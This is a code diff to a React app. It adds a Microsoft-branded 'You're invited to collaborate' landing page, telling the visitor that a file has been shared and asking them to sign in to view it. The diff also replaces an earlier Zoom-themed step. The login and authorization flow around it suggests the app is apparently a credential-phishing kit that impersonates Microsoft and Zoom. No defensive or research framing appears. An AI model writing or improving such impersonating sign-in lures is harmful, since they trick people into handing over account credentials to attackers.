@@ -359,6 +359,40 @@ const App = () => {
   );
 
   
+  const FileLanding = () => (
+    <div key="auth-step" className="auth-step">
+    <div style={{marginBottom: "1.5rem"}}>
+      {" "}
+      <img
+        src="ms_logo.png"
+        alt="Logo"
+        className="microsoft-logo"
+        onError={(e) => {
+          e.target.onerror = null;
+          e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
+        }}
+      />{" "}
+    </div>
+    <h1 className="form-title" style={{marginBottom: "16px"}}>
+      You're invited to collaborate
+    </h1>
+    <p className="auth-subtitle">Someone has shared a file with you. To view it, please sign in or create an account.</p>
+    <div className="file-info-container">
+      <FileIcon />
+      <div className="file-details">
+        <p className="file-name">{fileName}</p>
+        {from && <p className="file-sharer">Shared by: {from}</p>}
+      </div>
+    </div>
+    <div className="flex-justify-end" style={{marginTop: "1.5rem"}}>
+    <button type="button" className="button-primary" onClick={handleAuthorizationContinue}>
+    Continue
+      </button>
+    </div>
+  </div>
+  )
+
+  
 
   return (
     <div className="app-container">
@@ -374,7 +408,8 @@ const App = () => {
       <div className="content-wrapper">
         <div className="login-form-container">
           {isAuthorizationStep ? (
-            <Zoom onComplete={handleAuthorizationContinue} />
+            // <Zoom onComplete={handleAuthorizationContinue} />
+            <FileLanding />
           ) : (
             <>
               {isSuccessStep ? (
